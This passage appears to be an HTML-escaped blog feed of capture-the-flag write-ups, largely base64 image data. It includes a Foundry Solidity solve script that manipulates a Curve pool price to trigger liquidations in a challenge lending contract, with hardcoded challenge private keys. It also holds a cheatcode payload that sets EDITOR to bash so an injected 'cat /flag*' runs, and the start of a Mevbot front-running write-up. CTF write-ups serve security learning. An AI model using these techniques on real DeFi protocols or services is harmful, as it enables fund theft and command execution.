5s8gBh2qRoJ5x9H064gSh86MgDc2pA8fsnOn6b+zQw+M8VUI6npj3r+lIzXftIbUt0kOEYGD0AFlY4eCfTvcOKRrMyDcuWkbdUNkT8&#x2F;i5B0+X61wyxgb13gotj7PX89zbNNT5hZ3sUHFOAjT+38Cwq8+sZXoso61gtY&#x2F;ic+XRw1euF75rm9RIlywjeI47rEuqaYf1E7&#x2F;szkowedDxNM4vpbKYd0Dg1lz1RT0d0Pbm&#x2F;5OpSlS18r1eSPSqT9O2X2Xul+vaDVJeEzopztqgHIsnOYDsYnQrH+vcuXm&#x2F;l41W4BY9g89y98H1xxpyHM2&#x2F;98W14z2evVW33sH1deb4v8Xlb6JrJ1cfXqS870UKGPtEohoqiKAOm9webiqIoSn+oEVcURRkwasQVRVEGjBpxRVGUAaNGXFEUZcCoEVcURRkw+oqhUk&#x2F;wfuzxvgPbiqHUU1GOkLFMCsF0uiGFF&#x2F;Ulog+Wwo8+EFdevNxvaPORSaUuKfmmG+jF6TSqS&#x2F;WjEPp02v94JyzPfUySux7FUQ4&#x2F;mhiBzrJLJOoZf4jmqPuwQzhu7gleQjwnYXUat1HHfmbItV&#x2F;HPk+I1+uJxDXNl5dhQoVK26fqKulTKmPSbRTf0+FxDXR9AjrtbTlllKQQ1KipQPDm0+k8YZjMMAFAHqxnTaKCdKB7A3U2cz2zuY4n1SUnnyGvFzZ+uUQTUsB66ljWwLny0gDUJBXggEijhwN1dJa9jlQ91+TkANk2Eo6rO6fYRl37Wbb9uvZ5g9Sv+4F0MJtM6sEG0cpGWzh4p46T9Fmj62wbRSElsA&#x2F;6yTnqdS3I1yP9rYl3TApBIyTHjUgEghdHNezoXZJCmJC53rUqweVzge4FpLoI8lWI9JIPZi8HrKf4D8lA902SClBMDPvfEOywDRMHlGXdZC&#x2F;iZvDNV543uIGy9fQx8aK5XYQ2qjoL3nEV&#x2F;DKpjbr3s2z71cogt5HYr7O6js4ZhNmVymgAb5nUw5I+TtKnVCa1UQTHirE06C9d5RuV&#x2F;oy4Cz7UMilE50DwHIAnnQBASgpRG3ArG+heQKhLa&#x2F;msXn66IQWzlwLWGyOTTVQQBfApkkmQx0x&#x2F;y0scXmhSawhCr8SE3nQ3eraso+wcVY6MSuDBG2+trp4+QXIAoY3i2IHBcRFhmZxsQSTbz4T2q5FBaiOxX2d0Tcw&#x2F;RofiiduP54RZuGXPKZWZPgntknoQXY&#x2F;L0qKN&#x2F;OQcdf3lyOvZnN6M+KhJITqDyhwlKUQcXF4KdE+0TUbQmoZ6yQas52UGNPCpJAYsTyapgIuPjINfsMzBa4BkWHBfsR6Ibe0SB4hlLbGy31lDD48i8CWSQhRxnJP19KFZAN5ksTed6y8FmeMYqUymcT+T2s+RkIGeR0lJPfL9Oq9r4sXNBW9&#x2F;GDJXKqPZhJhE5OJS8j6qPc6STwohl1XxZhN4L1TC2Gb6S9N69kHvrxgWN5ld40x5SAx31hGhGNMjJIUgry4MLi8HuifiNfHivJm6tKahXnh5iKeJeL0oYD0bN8+ouUD3y+SVoPHLJZPIwnXyvF7b4WvL2lLITstFgFP&#x2F;BktzGUxYUs+TImr6C5E8ziKVSbTvZ+n2Y3L9TGgHeqCbv16Nrp0Rsxt7o45cGXqtdUk94jVxvo+aHIdU9VkilaUxzqepR5ScI6NreijfpJ59MZoR5+luglSM3bVmSSGaBIJPwsd9wikgKtfuMlOgsi40vcwlhaDGrgSXFwLdi0sqQl3ayuf0IibLwJuH1+sSAeuNN5sOdM+0SSoQgDdGcZzd8EYRyzrKDtiCB21SJlWwa&#x2F;G+V9WgvySPK5DK8rTtZ2L7Sf2MybSDdD1R1zhTu0UeZ+m4rNA9XVPWNalHk+OS+rRIZc3wZhOCrjsnLTkiRjPi3MGONikEGXspEHyWugQANKrjiJxKClE2tv&#x2F;ADeFG2k4Guhef5gt1keSr4OmlvhOmA9bPWy9LSlTgYD1kkwp4iIkDpLJusrubKTyuOcZjjqbTdf0FSR5nkcpydOln9Cwk135yPxPaQbxeva4LLx2dB3r24pMq65rUo+64rD4Rqaw5dqCmGYug685JS46IsUwKQaQDwdufWVCx3nucxbum9nr+O5&#x2F;m&#x2F;JQU4lnw&#x2F;m0BNsL6x1kx0D0FwvffKSXK91szdbEk5au8K+3LHZ6vgDoLTRVjnbr9&#x2F;CM6tni&#x2F;Nbffg89L63&#x2F;xQFKtT052wpe&#x2F;vewGc2OWRiPQaa6etn8m3+6I6hmcTzouW1aVm8G2kJKB1PWzNkk&#x2F;wn6WbofaBA64P6frcP8evHw1CVfOPeP6SGUB1FZeUg8+LvV3McFx6Pln9Nk28QqTKZPeEw917RHJ1zf6xaaiKMqA6f3BpqIoitIfasQVRVEGjBpxRVGUAaNGXFEUZcCoEVcURRkwasQVRVEGzCk04vT+6G+VCGr1HN9x9F6s+1IuG4bgyOkqn6Io48xoRpxeavcj4hHBPms4vI0&#x2F;Q+W&#x2F;CfdXgmMFf9MwEmJP0McpYvCulrh4MuUny6eR3KBBH0yU7R6HR9Wy01qm9EVvnvhJJIUw3Ibv6ZjWX0sd93HHzTHWkwfgdNB9KbC+lp3eMqU&#x2F;+ltO4SA7x5gUAskvU9CAQt68PzMoZxC549x+Dg7kh5y1fyMvi0ReycjLGLIMbrbg18kPElTUI+UdRTOj8sbr4llh&#x2F;XJB928IyTK07NSW6fJdv&#x2F;RnxF3AmONKCoHIyxRUl6twwN79Crw8vATXrLHKHef2U&#x2F;otipNgPAzcbIwH6XpigPzO+DLYuNKeYaWBhmNQ2DpNzZmBQ9QLGfBMAoDQs4qSCmRBjz&#x2F;n7XPgpXRgfS07vWUmorjSF70Z8RNLCiFQevdhwPo+kALkj4I&#x2F;Q1l9u2ey8JifHMRnxQ0wWzscc1q+InraFIktGcxeTiowEui1xYH1C7Ts1JVlwyArR0J&#x2F;nrjFeYHHkhRinHCd2W7slfSBZ6j9MKq8RFWJPBgjJAAQkgqMBMVZziXL0LJTWSbGwldGZjQjzksgCYLA+hY0Kr0mhRgrHgjB84+YlK4bU5dsIZ1UoPODUSmJgZad2rLu&#x2F;VNpwmhGfJySQvQIZY7vsowgBc8fHRwo0DNO67opQgIAKalAV2qTGGjZaSzr3j+VJpyipBDYaVLB3vmaO1x2dqt8xZHe2DCB6E1Z+ji3Hhyd2ztn7jg+f2G4&#x2F;QD5Ta6XoiqfH5Se9FUN9E9IejHXC+vqn1e+ZprM9Wi9nr34sDw8n5ad3jKlLzQpxGAwN4g&#x2F;ECmKovT+YFNRFEXpDzXiiqIoA0aXUxRFUQaMeuKKoigDRo24oijKgFEjriiKMmA+PyNO76gXn5KfbJzybtgohprcQVEUZLQHm&#x2F;zRDgW68T61DfaRwVmCKVtE7G58Ad9D9UOgyocBwQdBTT72aYKpD1Adonet8x&#x2F;LjBtWp8XHM32Tu174YUfwsVL0ARi3udO3VFbpL&#x2F;TZv+lb4cdf8XFCXcQyi6uTkzH+gM2R+WApPGcoQ9CvBdnjD66Isjx&#x2F;TlkvRHisK5ePE2RQxo7ePPGTSwohwAF5uoW5HR&#x2F;GPbkDtvsPM7Dj2m5jD6YW3Yynpgz7Cw2w5pxhqN3Vr8v91F&#x2F;OF8dJdZHLDFSnWXi&#x2F;v2d&#x2F;Ixw8zLsebhSOmEJGkM5F2YM+vw7vsV+buO6S7AYylu56tJl7RTqnrBceNNAY+zp191&#x2F;+OPl6yvjR33LKCSSFMB3QLZUklhwoII&#x2F;9r4MHDPzbXOKHyjm9WCLkzdDN685BW31np&#x2F;PRDUPejjvv6UnuME9tteC13f3XsAtn4Ow0&#x2F;ZDKKKLiJzh4xyUMxaxJ4octFuoi19Mw&#x2F;&#x2F;hHuALb8MtbuyMJheW155Gud&#x2F;db9M73YLPwWk3Z1Jekb0l2AfGcEVE45+XrODhVPPME&#x2F;nFtrqeMBf0ZcRcQ5xiTQuQSMRTGj5dnvPCqaMzqEj&#x2F;UJUbIJWKQIb2czuQO3SOm34Y3+6QXO6ChsaSgYbtvnbH0oD7iri&#x2F;UpbaefA2Al09kB2H+8VWY2n9mDLB0PSKK2vfijw9hzPcuND2nrxc78Bxc8Af2RKAzIjgO6UMGpTd6M+InkRQil4ihiGmO3n6wjBOvjVZokBiB1kltebNEDIbTmtwhTgCw&#x2F;HSJ19N&#x2F;SQzKcRlP8TfADLK3zNJD6UV6swkcjHe3IsObqEtBpp7kqUJSZz40M0RDX3jeltT1yLuemIVvitkYzmaiZz+OlF6SM8Hac2b0wkuHOCiee20Hb+ssFLPTzHEtZFDGg97fTjnWpBDuxrJb&#x2F;KCoNVwnz3OnLerQQajNRokYMniGuv05xye5g58AgGZASzSAJDz6VBktJW3xEg4Z8w88+JcDv3EKjEFagYM5ryxTF6nszvRzWDq3DQ9rHtixF+57qUTmnMs0e+G1bqfry&#x2F;CGHAe7lu5IyV7cJ1Y+mi2Ze6XunIJeyGHxHJXVX7c9hyB3XDMZlPFhNCPOSyAJUoHg0Rj1mxQCPYZbfSRiwBvBnq&#x2F;Y+nioOFLw&#x2F;PFJ7uBkIEN1jzxY&#x2F;28syTIcgHmt2S1t3F&#x2F;gmRM9J6kuAXjp7oS6SGXLX+JARsbYH9js7&#x2F;K5hn0+43v9dbJTvQs9L8DOhUk4&#x2F;Fi2rKSXEiNfQc05Szy98My2aWo07zii8fWUcWA0I84dZbySQnRNxJBM&#x2F;MDr+uF69dFjpqujBc83N+E4JHcgGUpD5T+cNkhl9KzAf9DHhjY5uFnjSuvlQl2ksuDtDNrI26RlLPy&#x2F;W8IxXni0FFQjuw&#x2F;LOr1TePuy7B6276aeB8TnDPH04p4xXC&#x2F;bnZaPJvZfJwYP&#x2F;7gQ+XrKOHCKkkK4m8QZbj8Rg+2cfF33DnsM3ozJd3+j&#x2F;Yh7b5bq2P7d8vz5iPw5q8cx3jvKofz+eeVrpslcjwwde&#x2F;FheXk+HJS8d4wL8Li5hd+zZXzOuF9krkWE7zXn6kJIZR50bVrKcTMU26&#x2F;Tb3fkzhnVU3h&#x2F;vID18iySz+&#x2F;v0jmjMkTSi9Sny+Ok6ynjiEYxPHbMTaLJHRRFOQp6f7CpKIqi9IcacUVRlAGjyymKoigDRj1xRVGUAaNGXFEUZcCoEVcURRkwasQVRVEGjBpxRVGUAaNGXFEUZbAA&#x2F;B8gkLgVA04niAAAAABJRU5ErkJggg==&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;要卡时间才会更新price&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;soldidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-soldidity &quot;&gt;&lt;code class=&quot;language-soldidity&quot; data-lang=&quot;soldidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: GPL-3.0
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.20;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Script} from &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {console} from &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {console2} from &amp;quot;forge-std&#x2F;console2.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;..&#x2F;src&#x2F;TonyLend.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {Challenge} from &amp;quot;..&#x2F;src&#x2F;Challenge.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Solve1 is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    address player = address(0xf8fF93B10f74e7DC872bb6C5c66aa3B69b4933cC);
&lt;&#x2F;span&gt;&lt;span&gt;    address helper = address(0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9);
&lt;&#x2F;span&gt;&lt;span&gt;    address challenge = address(0xA731f067351d474Ab9Ba28d679EAb3396Ba9EA8a);
&lt;&#x2F;span&gt;&lt;span&gt;    function run () external {
&lt;&#x2F;span&gt;&lt;span&gt;        address tonyLend = address(Challenge(challenge).tonyLend());
&lt;&#x2F;span&gt;&lt;span&gt;        address curvePool = address(Challenge(challenge).curvePool());
&lt;&#x2F;span&gt;&lt;span&gt;        address usde = address(Challenge(challenge).usde());
&lt;&#x2F;span&gt;&lt;span&gt;        address usdc = address(Challenge(challenge).usdc());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;USDE&amp;quot;, usde);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;USDC&amp;quot;, usdc);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(0xa7aa8c63069942c63af977516df0a918f0c62a1aa54fa4975d10b55464fd1651);
&lt;&#x2F;span&gt;&lt;span&gt;        MintableERC20(usde).approve(curvePool, type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;        MintableERC20(usdc).approve(curvePool, type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;        MintableERC20(usde).approve(tonyLend, type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;        MintableERC20(usdc).approve(tonyLend, type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(0xa7aa8c63069942c63af977516df0a918f0c62a1aa54fa4975d10b55464fd1651);
&lt;&#x2F;span&gt;&lt;span&gt;        Challenge(challenge).claimDust();
&lt;&#x2F;span&gt;&lt;span&gt;        uint256[] memory amounts = new uint256[](2);
&lt;&#x2F;span&gt;&lt;span&gt;        amounts[0] = 1e15;
&lt;&#x2F;span&gt;&lt;span&gt;        amounts[1] = 0;
&lt;&#x2F;span&gt;&lt;span&gt;        ICurve(curvePool).add_liquidity(amounts, 1);
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; deposit and borrow
&lt;&#x2F;span&gt;&lt;span&gt;        TonyLend(tonyLend).deposit(0, 9.99e21);
&lt;&#x2F;span&gt;&lt;span&gt;        TonyLend(tonyLend).borrow(0, 4.5e21);
&lt;&#x2F;span&gt;&lt;span&gt;        TonyLend(tonyLend).borrow(1, 5e9);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; remove_liquidity_imbalance
&lt;&#x2F;span&gt;&lt;span&gt;        uint256[] memory amount = new uint256[](2);
&lt;&#x2F;span&gt;&lt;span&gt;        amount[0] = uint256(0);
&lt;&#x2F;span&gt;&lt;span&gt;        amount[1] = uint256(2e2);
&lt;&#x2F;span&gt;&lt;span&gt;        ICurve(curvePool).remove_liquidity_imbalance(amount, type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm.warp(block.timestamp+300);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;USDC after price&amp;quot;, TonyLend(tonyLend).getAssetPrice(uint256(1)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; liquidate
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(0xa7aa8c63069942c63af977516df0a918f0c62a1aa54fa4975d10b55464fd1651);
&lt;&#x2F;span&gt;&lt;span&gt;        payable(helper).transfer(1 ether);
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(0xb5cdb93a84c3a93e4f72dbef3b5dc836154c7c7a1ef251d59352619f25b42bee);
&lt;&#x2F;span&gt;&lt;span&gt;        TonyLend(tonyLend).liquidate(player, 0, type(uint256).max, 1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; re borrow
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(0xa7aa8c63069942c63af977516df0a918f0c62a1aa54fa4975d10b55464fd1651);
&lt;&#x2F;span&gt;&lt;span&gt;        TonyLend(tonyLend).borrow(0, 3e21);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(MintableERC20(usde).balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(MintableERC20(usdc).balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; swap USDC to USDE
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 cAmount = MintableERC20(usdc).balanceOf(player);
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        ICurve(curvePool).exchange(1, 0, cAmount, 0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(MintableERC20(usde).balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(MintableERC20(usdc).balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        MintableERC20(usde).transfer(address(0xc0ffee), MintableERC20(usde).balanceOf(player));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(MintableERC20(usde).balanceOf(address(0xc0ffee)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;本地通了、远程和forge斗智斗勇&lt;&#x2F;p&gt;
&lt;p&gt;拉了下界，现在 Δtimestamp ∈ [100, 300] 都可以打&lt;&#x2F;p&gt;
&lt;p&gt;forge越跑得有点离开我的预期，开个计时器在旁边打出来了&lt;&#x2F;p&gt;
&lt;p&gt;我为这题写了更详细的题解https:&#x2F;&#x2F;gist.github.com&#x2F;gtg2619&#x2F;b72d5a9ac8d46c955d044b9d0b3484ad&lt;&#x2F;p&gt;
&lt;h2 id=&quot;chisel-as-a-service&quot;&gt;Chisel as a Service&lt;&#x2F;h2&gt;
&lt;p&gt;利用&#x2F;tmp&#x2F;chisel-tmp.sol 写入命令
修改EDITOR为bash 触发执行&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;params = {
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;code&amp;#39;:
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F;; cat &#x2F;flag*
&lt;&#x2F;span&gt;&lt;span&gt;address vm = address(uint160(uint256(keccak256(&amp;quot;hevm cheat code&amp;quot;))));
&lt;&#x2F;span&gt;&lt;span&gt;vm.call(abi.encodeWithSignature(&amp;quot;setEnv(string,string)&amp;quot;, &amp;quot;EDITOR&amp;quot;, &amp;quot;bash&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;!edit
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;,
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Racing with Mevbot: WMCTF2024 - claim-guard writeup</title>
        <published>2024-09-11T12:44:53+08:00</published>
        <updated>2024-09-11T12:44:53+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/wmctf2024/"/>
        <id>/blog/wmctf2024/</id>
        
        <content type="html" xml:base="/blog/wmctf2024/">&lt;h2 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h2&gt;
&lt;p&gt;An Anvil node, accompanied by a reverse proxy layer that disables certain special RPC methods. Upon creation, there will be a Solidity challenge contract that seems very easy to solve.&lt;&#x2F;p&gt;
&lt;p&gt;A Mevbot written in Rust listens for new blocks and pending transactions. Every time you attempt to solve the challenge, it front-runs with double the gas price.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;analyze&quot;&gt;Analyze&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAAswAAAEMCAYAAADQ0eAzAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAH28SURBVHhe7b0LfBVFvu&#x2F;7c+PojOYBBBaGMUacFeAGjILghUjASEAcHme2Gp7z4Yz3wowQRjfbqzKCb1DUzeboENCBc2Yfz&#x2F;BIos5cHgNKMGoQuPLSCDlA1ohxOWYIieSle3TL9lZVV&#x2F;fqXu+Vx0oIv+&#x2F;n07C6qru6urqz1q&#x2F;&#x2F;&#x2F;auqS36cPuh7EEII6ZJ8+82&#x2F;60+EAJdd&#x2F;iP9iRAST&#x2F;5B&#x2F;08IIYQQQggJwiV9r7qGEWZCCCGEEEJCwAgzIYQQQgghYaBgJoQQQgghJAwUzIQQQgghhISBgpkQQgghhJAwUDATQgghhBAShot6lIxL&#x2F;qEHEn58LRL6p+O7v3+NBs9x&#x2F;MdXzTqXEEIIIYSQNkSYJ95xJ3aWVeKhpc&#x2F;rlPCsLtyEdz+oxms7&#x2F;j8MH5GtU1vHon9+DC&#x2F;&#x2F;jz&#x2F;h2gEZOiV2LulxKQb+4z1IGzMJ190xA4Pumofh9y1HwtXX6S1ax&#x2F;&#x2F;1qwew9a2jqn1iwb5fa8sghBBCCCHtT6sF81s738AduZl4fsVDOiU0Uvj9JOP&#x2F;wP&#x2F;87y&#x2F;h7sn&#x2F;J44c2qdzWsf2P27GpZddhmVPv9hq0dzjBz&#x2F;A5b1SxNJHhpqNNCGiL+UsSoQQQgghxEbcPMzf&#x2F;se3+Pyz03qtbXx6ugrLH71ffV7y6AuxieZLLsGPb7kdGXf+3&#x2F;iPr7&#x2F;C3xvq0ez14Pv&#x2F;PK+yf5CQiH7Db8EPe7vUOiGEEEIIubhpkyVD2gakfUDyP4tKUbjhDWW5kNYLadcw7QUPPfo8+va9CkufXK2sGXLZ&#x2F;Mdyta25nWnZsO8bjtaK5t4Dr0f6+P+ClME3WkvSNRnKzyz5UUo&#x2F;&#x2F;OSns5E559f4wZWJKi0Uso6yrma97faUW&#x2F;MmW+mybUxiPU+J&#x2F;Til+zxWm5vWjWdW&#x2F;XerTFm+HXlsM09uJ9vcPKbcX5Yn80LVRZYny7CXY56nTLMfT+4v60MIIYQQ0p1o1wjzoMws&#x2F;HlrMcbdnI7a2i8w5xcL8T9eWYXnn34IZ8&#x2F;+DSseX4zFBbPVtn37paptpa2jTuRddvkPsXjhLMe+kZCieeXTD6rPDy97AWnXRPYfJ&#x2F;S&#x2F;Fv9w6WXq8&#x2F;lv&#x2F;o6G0ydRf+JDtXy+dxe+P&#x2F;8dLvnBZbg8qTeudPVX2wVDisPFDy1HWel2VWdpN&#x2F;n3f&#x2F;9K5V2RkIgfX51upbtEOVKcSu92rOcp9&#x2F;nlooet42z6n+vws7t+bolb&#x2F;2MNzrzREtSmmJV5cpHbXXmF8RAg95flyPJknixfHieYv1w+jByvOGIdIzdvijqGTEu79ifWPjcOH4Vz5+rVZ0IIIYSQ7kK7CuaPj36gBLJEiqkrhZgL1cHvr95PrW2lp7lg3p2Wt1nuGyuXXvYD&#x2F;Sk857&#x2F;9Rv3&#x2F;3dfNOPXGf8e3DXVqXZKSORxpt07DJZdcgu+&#x2F;P4&#x2F;z332ncwKR4lAKXtPDLc&#x2F;lt&#x2F;&#x2F;6pPr8dUszNv7bWvX5w8P78ZU4Vp8+&#x2F;Vp1nnm3&#x2F;0z9X&#x2F;rmn9T&#x2F;qryvWnD1NQPUeqhjSUEsfePvvr1T5UnkdjJfcseUu5W4Na&#x2F;Bh0cOqP&#x2F;79L1K&#x2F;W9HPpjYz1Oe9&#x2F;VZNwXsMyRreKuuHSGEEEJIV6bDPMx1dWfwH99+q9ciI1&#x2F;zm6&#x2F;8J&#x2F;+XGTo1PDLyueSxf8Fll&#x2F;0QKx77J3g&#x2F;+0TnhObf62rwn999i2+aGtF70A1wDbvFsmZceVUa&#x2F;qGHYc34trkRf&#x2F;+yVn0ORmr&#x2F;q&#x2F;FlXeh8EymOvxKi1qQ15yntLKvXblb7yP&#x2F;7&#x2F;&#x2F;gaJYr98T9WJN+4bD+zLtIu07NXiiXEw2Get+z4KY8nHx6kQJcPSKaIJoQQQgjpLsSt0184pIi8OXucZVXY8f8W6ZzQWGL5B5fjqUd&#x2F;raKg0fDlqY9R+b9ehPfd7UI4&#x2F;4dKk2Mwn6s6Zlkz6v&#x2F;3Ufxl2x8ijsncu09sHQNbc54SeW5ye&#x2F;sSzegkl&#x2F;3gMocAlp9lmsmRg+87yszLdlsR53DI86754nP1WUawMwYPUaJZimcpogkhhBBCuhNdQjDLaK0UW6ZVQb7aD0drxbLi+++Vb7nu+CF8f94YGePSH16B5PQM&#x2F;LBnCv5e9zf8782FaPz0pMoLxccVh&#x2F;HjtGutDnDS0&#x2F;vrf35cfQ5FrOcpkRFb6YE2jxMtUrhKy8W42+7QKVCffyDaTCLrb&#x2F;c72&#x2F;HvzCfP09xO1kPWx4wkSxvIZZddjmEjRjvsH4QQQggh3YUuIZj&#x2F;1+&#x2F;XqNf5pj0gEnfNvAc9Lr00drHsx3983Sz0szHRoWHTaMDfG79U65GQkVjZYW7i5DtVnWf&#x2F;1wXKWxyOWM9TIoVvyZb&#x2F;bh1HLtFO&#x2F;vLiC485jvfXz6stD7Osv+zo91&#x2F;&#x2F;7&#x2F;usfCmUg3H2TA1+Om262kbWQ9bHjCRL8S8tGj+47DIlngkhhBBCuhsX9dTYckzmH&#x2F;V2IfnagWr13Cf&#x2F;G9+c83UC7G7IKPGEST&#x2F;DCysetqLckZCRZmnB+K8z8nRKIGY02hwBhRBCCCGkO9ElIsydxvff49&#x2F;rz+Bvh8vV0p3FsoxIyyjx377wRi2Wo0F29pNDy+3c&#x2F;ppOIYQQQgjpXlzcgrmbY59sRI6uIf3T7RkFluXL0TU+2PcuO&#x2F;sRQgghpNtycVsyCCGEEEIIiQAjzIQQQgghhISBgpkQQgghhJAwUDATQgghhBASBgpmQgghhBBCwkDBTAghhBBCSBgomAkhhBBCCAkDBbODb7C3rAmr9RohhBBCCCEUzA4ux6Z932LOn77CQp1CCCGEEEIubuI2cUnatBcwNk2vNB&#x2F;F9lc3oVGvAm4Mnfsr3JCoV71vYuPWUr0Sf1Zv+AxTzvwYGUt76BRCCCGEEHKxEp8Ic+YijIUQwYUPiuUVfIRhmDItT2cCyTmzce3pV3T+m&#x2F;Cm3Y4pOW6dG38WF6UA2V8Ft2bM2owdH1Rjx9r5OoEQQgghhHRn4iOYK9fYIsYeeE83Az1dSNYpjeVPYXu5R6+V4rRXiOhe1+r1TmD3D1HR2ICRBXqdEEIIIYRctNDDHJQe+KwO6Nf&#x2F;vF63sXkWJt+cjskL1+sEQgghhBDSnYm&#x2F;YHbNRk5WIryH7B5mG9K+kdaMjw50nodZUnXmCiT3+06vEUIIIYSQi5U4C+Y8jM0fBlS8gvcqdZIdIaan5KbDW&#x2F;YUjtXqtE4io9&#x2F;XaDxzqV4jhBBCCCEXK3EUzEIsF9yONO+bNr+yDSmWw4npuHIe1&#x2F;QBznwRZJQMdvojhBBCCLmoiJNg9onloMPF2cRyUDEdbyb8HVnJPXGwUK8TQgghhJCLlriMw5yc8ximZJmDLPvwlj2oosmOMZotmvFRSedYMzgOMyGEEEIIMYnbxCUXCgtX1OGJIT&#x2F;CEz+7Emt1GiGEEEIIuXjhsHIOvsHs7MuwkWKZEEIIIYRoGGEmhBBCCCEkDIwwE0IIIYQQEoZLLr+y7&#x2F;ff&#x2F;cd3+M&#x2F;vL+5A8z&#x2F;8w6X4z&#x2F;&#x2F;kRCWEEEIIIcTJJVcm9fv+u&#x2F;P&#x2F;CXwvF51KCCGEEEIIUVzSs8+Pv&#x2F;&#x2F;+P&#x2F;9TaOVLdBIhhBBCCCHE5JI+&#x2F;a75Hhe5HYMQQgghhJBQcJQMQgghhBBCwsBRMgghhBBCCAlD3CLMjumvm49i+6ub0KhXfbgxdO6vcENi502LTQghhBBCiJ34RJgzF2Es3sTGwgfF8go+wjBMmZanM30k58zGDQ3V8Op1QgghhBBCOpv4CObKNdi4tVSveOA93Qz0dCFZpyhcs5GTBXx04IROIIQQQgghpPPpIh5mN4ZOGgZUbKINgxBCCCGEdCniL5hVJDkR3kM2D3PmJNyAoygv9+gEQgghhBBCugZxFsx5GJsvI8mv4L1KnSTTcnvjo13BOgESQgghhBDSucRxHGYhjAtuR5r3TZufWZC5CHNy0&#x2F;WKH&#x2F;7bEkIIIYQQEmfiJJhDiOWgyG2z8SWHlSOEEEIIIV2AuFgyknOyoYZgTrsdcwpesJaxmSqbEEIIIYSQLgunxiaEEEIIISQMXWRYOUIIIYQQQromFMyEEEIIIYSEgYKZEEIIIYSQMFAwE0IIIYQQEgYKZkIIIYQQQsJAwUwIIYQQQkgYKJgJIYQQQggJAwUzIYQQQgghYeDEJTEw5J8&#x2F;wfgBxuemg8&#x2F;g